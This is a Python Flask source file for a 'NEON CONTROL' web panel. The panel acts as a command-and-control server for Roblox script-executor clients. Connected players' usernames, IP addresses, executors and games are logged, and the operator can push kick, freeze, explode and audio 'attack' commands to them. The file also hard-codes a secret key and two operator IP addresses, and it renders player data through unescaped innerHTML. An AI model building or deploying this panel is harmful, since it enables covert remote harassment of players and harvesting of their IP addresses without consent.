from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO, emit
import time
import eventlet
from datetime import datetime

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "cyber_admin_ultra_999"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

# --- CONFIGURATION ---
ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_commands = {}
history_logs = [] # Stockage en mémoire vive

def add_to_history(action, p_data):
    log = {
        "id": str(time.time()),
        "time": datetime.now().strftime("%H:%M:%S"),
        "user": p_data.get("username", "Inconnu"),
        "userid": p_data.get("userid", "0"),
        "ip": p_data.get("ip", "0.0.0.0"),
        "executor": p_data.get("executor", "N/A"),
        "gameName": p_data.get("gameName", "Unknown Game"),
        "gameId": p_data.get("gameId", "0"),
        "action": action
    }
    history_logs.insert(0, log)
    if len(history_logs) > 100: history_logs.pop()
    socketio.emit("update_history", history_logs)

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip: ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS: abort(403)

@app.errorhandler(403)
def access_denied(e):
    return '<body style="background:#000;color:red;text-align:center;padding-top:20%"><h1>ACCÈS REFUSÉ</h1></body>', 403

# --- INTERFACE HTML/CSS/JS ---
HTML = """
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>NEON CONTROL v2</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet">
<style>
    :root {
        --bg: #030303;
        --card-bg: rgba(15, 15, 20, 0.9);
        --accent: #00f2ff;
        --danger: #ff0055;
        --warning: #ffcc00;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { 
        font-family: 'Rajdhani', sans-serif; background: var(--bg); color: #fff; 
        background-image: radial-gradient(circle at 50% 0%, #0a1a2a 0%, #030303 80%);
        min-height: 100vh; overflow-x: hidden;
    }

    .container { max-width: 1800px; margin: auto; padding: 15px; }
    
    header { text-align: center; margin-bottom: 25px; border-bottom: 1px solid rgba(0, 242, 255, 0.1); padding-bottom: 15px; }
    h1 { font-family: 'Orbitron'; font-size: 1.8rem; color: var(--accent); text-shadow: 0 0 10px var(--accent); letter-spacing: 5px; }

    .main-layout { display: grid; grid-template-columns: 1fr 380px; gap: 20px; }

    /* GRILLE DES JOUEURS - COMPACTE */
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 12px; }

    .card { 
        background: var(--card-bg); border: 1px solid rgba(255, 255, 255, 0.05); 
        border-radius: 10px; padding: 12px; position: relative; transition: 0.2s;
        backdrop-filter: blur(5px);
    }
    .card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 242, 255, 0.1); }

    .trash-player { position: absolute; top: 10px; right: 10px; background: none; border: none; color: #333; cursor: pointer; font-size: 1rem; }
    .trash-player:hover { color: var(--danger); }

    .status-badge { display: flex; align-items: center; font-size: 0.65rem; font-weight: bold; margin-bottom: 8px; color: #888; }
    .dot { width: 6px; height: 6px; border-radius: 50%; margin-right: 5px; background: #444; }
    .dot.online { background: var(--accent); box-shadow: 0 0 8px var(--accent); }

    .name a { font-family: 'Orbitron'; font-size: 1rem; color: var(--warning); text-decoration: none; }
    .name a:hover { text-decoration: underline; }

    .info-box { font-size: 0.75rem; color: #aaa; margin: 8px 0; line-height: 1.4; border-left: 2px solid #222; padding-left: 8px; }
    .info-box b { color: #eee; }
    .info-box a { color: var(--accent); text-decoration: none; font-weight: 600; }

    .section-label { color: var(--accent); font-size: 0.6rem; letter-spacing: 1px; margin: 10px 0 5px; text-transform: uppercase; opacity: 0.6; }

    .btn-group { display: grid; grid-template-columns: repeat(2, 1fr); gap: 5px; }
    .btn { 
        padding: 6px; border: none; border-radius: 4px; cursor: pointer; 
        font-weight: 600; font-family: 'Rajdhani'; font-size: 0.75rem; color: white; transition: 0.2s;
    }
    .btn-troll { background: rgba(0, 242, 255, 0.05); border: 1px solid rgba(0, 242, 255, 0.2); }
    .btn-troll:hover { background: var(--accent); color: #000; }
    .btn-kick { background: linear-gradient(45deg, #800, var(--danger)); font-weight: bold; }
    .btn-undo { background: #111; color: #666; border: 1px solid #222; }
    .btn-undo:hover { color: #fff; border-color: #444; }

    /* HISTORIQUE */
    .history-panel { background: rgba(5, 5, 5, 0.8); border: 1px solid #111; border-radius: 12px; padding: 15px; height: 85vh; display: flex; flex-direction: column; }
    .history-list { flex-grow: 1; overflow-y: auto; scrollbar-width: thin; scrollbar-color: var(--accent) #000; }
    .history-item { padding: 10px; border-bottom: 1px solid #111; font-size: 0.75rem; animation: fadeIn 0.3s ease; }
    .hist-time { color: var(--accent); font-family: monospace; }
    .hist-user { color: var(--warning); font-weight: bold; }
    .hist-details { color: #666; display: block; margin-top: 3px; }
    .hist-details a { color: #888; text-decoration: none; font-style: italic; }

    /* MODALS */
    .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:1000; align-items:center; justify-content:center; backdrop-filter: blur(4px); }
    .modal.active { display: flex; }
    .modal-content { background: #080808; padding: 25px; border: 1px solid var(--accent); border-radius: 12px; width: 320px; text-align: center; }
    .modal-content input { width: 100%; padding: 10px; background: #111; border: 1px solid #222; color: #fff; margin: 15px 0; border-radius: 5px; }

    @keyframes fadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
</style>
</head>
<body>

<div class="container">
    <header><h1>NEON CONTROL PANEL</h1></header>
    
    <div class="main-layout">
        <section>
            <div class="grid" id="players"></div>
        </section>

        <aside>
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
                <span style="font-family: 'Orbitron'; font-size: 0.7rem; color: var(--accent);">SYSTEM_LOGS</span>
                <button onclick="clearHistory()" style="background:none; border:none; color: #444; cursor:pointer; font-size:0.6rem;">[ PURGE ALL ]</button>
            </div>
            <div class="history-panel"><div class="history-list" id="history-list"></div></div>
        </aside>
    </div>
</div>

<div class="modal" id="kickModal"><div class="modal-content">
    <h2 style="color:var(--danger); font-family: 'Orbitron'; font-size: 1rem;">TERMINATE</h2>
    <input type="text" id="kickReason" placeholder="Raison...">
    <div style="display:flex; gap:10px">
        <button class="btn btn-undo" style="flex:1" onclick="closeModal('kickModal')">Annuler</button>
        <button class="btn btn-kick" style="flex:1" id="confirmKickBtn">EXECUTE</button>
    </div>
</div></div>

<div class="modal" id="soundModal"><div class="modal-content">
    <h2 style="color:var(--accent); font-family: 'Orbitron'; font-size: 1rem;">AUDIO_TRANSMIT</h2>
    <input type="text" id="soundAssetId" placeholder="Asset ID">
    <div style="display:flex; gap:10px">
        <button class="btn btn-undo" style="flex:1" onclick="closeModal('soundModal')">Annuler</button>
        <button class="btn btn-troll" style="flex:1; background:var(--accent); color:#000" id="confirmSoundBtn">SEND</button>
    </div>
</div></div>

<script>
const socket = io();
let selectedUid = null;

function openKickModal(uid) { selectedUid = uid; document.getElementById('kickModal').classList.add('active'); }
function openSoundModal(uid) { selectedUid = uid; document.getElementById('soundModal').classList.add('active'); }
function closeModal(id) { document.getElementById(id).classList.remove('active'); selectedUid = null; }

function sendTroll(uid, cmd, assetId = null) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid, cmd: cmd, assetId: assetId})});
}
function deletePlayer(uid) { fetch("/delete_player", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: uid})}); }
function clearHistory() { fetch("/clear_history", {method: "POST"}); }
function deleteLog(id) { fetch("/clear_history", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({log_id: id})}); }

document.getElementById('confirmKickBtn').onclick = () => {
    sendTroll(selectedUid, 'kick', document.getElementById('kickReason').value || "Terminé");
    closeModal('kickModal');
};
document.getElementById('confirmSoundBtn').onclick = () => {
    sendTroll(selectedUid, 'playsound', document.getElementById('soundAssetId').value);
    closeModal('soundModal');
};

socket.on("update", (data) => {
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));

    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) {
            card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card);
        }
        card.innerHTML = `
            <button class="trash-player" onclick="deletePlayer('${id}')">✕</button>
            <div class="status-badge"><div class="dot ${p.online ? 'online' : ''}"></div>${p.online ? 'SYNC_ACTIVE' : 'OFFLINE'}</div>
            <div class="name"><a href="https://www.roblox.com/fr/users/${id}/profile" target="_blank">${p.username}</a></div>
            <div class="info-box">
                IP: <b>${p.ip}</b><br>
                EX: <b>${p.executor}</b><br>
                G: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.gameName}</a>
            </div>
            <div class="section-label">Attack</div>
            <div class="btn-group">
                <button class="btn btn-kick" onclick="openKickModal('${id}')">KICK</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','explode')">BOOM</button>
                <button class="btn btn-troll" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="btn btn-troll" style="background:orange; color:#000" onclick="openSoundModal('${id}')">AUDIO</button>
            </div>
            <div class="section-label">Restore</div>
            <div class="btn-group">
                <button class="btn btn-undo" onclick="sendTroll('${id}','unfreeze')">THAW</button>
                <button class="btn btn-undo" onclick="sendTroll('${id}','stopsound')">MUTE</button>
            </div>
        `;
    });
    document.querySelectorAll('.card').forEach(c => { if (!currentIds.has(c.id.replace('card_', ''))) c.remove(); });
});

socket.on("update_history", (logs) => {
    const list = document.getElementById("history-list");
    list.innerHTML = logs.map(log => `
        <div class="history-item">
            <div style="display:flex; justify-content:space-between">
                <span class="hist-time">[${log.time}]</span>
                <span onclick="deleteLog('${log.id}')" style="cursor:pointer; opacity:0.3">✕</span>
            </div>
            <span class="hist-user">${log.user}</span> <span style="font-size:0.6rem; color:#444">${log.ip}</span>
            <div style="color:var(--accent); margin:2px 0">${log.action}</div>
            <span class="hist-details">
                <a href="https://www.roblox.com/fr/games/${log.gameId}" target="_blank">${log.gameName}</a> | ${log.executor}
            </span>
        </div>
    `).join('');
});
</script>
</body>
</html>
"""

# --- ROUTES PYTHON ---

@app.route("/")
def index():
    check_ip()
    return render_template_string(HTML)

@socketio.on('connect')
def handle_connect():
    emit("update_history", history_logs)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        d = request.get_json(silent=True) or {}
        uid = str(d.get("userid", ""))
        if d.get("action") == "register" and uid:
            d["userid"] = uid
            if uid not in connected_players:
                add_to_history("CONNEXION_ESTABLISHED", d)
            connected_players[uid] = {
                "username": d.get("username", "Unknown"),
                "ip": d.get("ip", "Unknown"),
                "gameName": d.get("gameName", "Click to View"),
                "gameId": d.get("gameId", "0"),
                "executor": d.get("executor", "Unknown"),
                "last": now, "online": True
            }
        elif d.get("action") == "heartbeat" and uid in connected_players:
            connected_players[uid]["last"] = now
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if uid in pending_commands:
            return jsonify(pending_commands.pop(uid))
        return jsonify({})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    d = request.get_json()
    uid, cmd = str(d["userid"]), d["cmd"]
    assetId = d.get("assetId")
    pending_commands[uid] = {"command": cmd, "assetId": assetId} if assetId else {"command": cmd}
    p_data = connected_players.get(uid, {"username": "Unknown"})
    add_to_history(f"COMMAND_SENT: {cmd.upper()}", p_data)
    return jsonify({"sent": True})

@app.route("/delete_player", methods=["POST"])
def delete_player():
    check_ip()
    uid = str(request.get_json()["userid"])
    if uid in connected_players:
        add_to_history("USER_REMOVED_FROM_PANEL", connected_players[uid])
        del connected_players[uid]
    return jsonify({"ok": True})

@app.route("/clear_history", methods=["POST"])
def clear_history():
    check_ip()
    global history_logs
    data = request.get_json(silent=True)
    if data and "log_id" in data:
        history_logs = [l for l in history_logs if l["id"] != data["log_id"]]
    else:
        history_logs.clear()
    socketio.emit("update_history", history_logs)
    return jsonify({"ok": True})

def broadcast_loop():
    while True:
        now = time.time()
        to_remove = []
        for uid, p in connected_players.items():
            p["online"] = (now - p["last"] < 15)
            if now - p["last"] > 60: to_remove.append(uid)
        for uid in to_remove:
            add_to_history("SESSION_TIMEOUT", connected_players[uid])
            del connected_players[uid]
        socketio.emit("update", {"players": connected_players})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
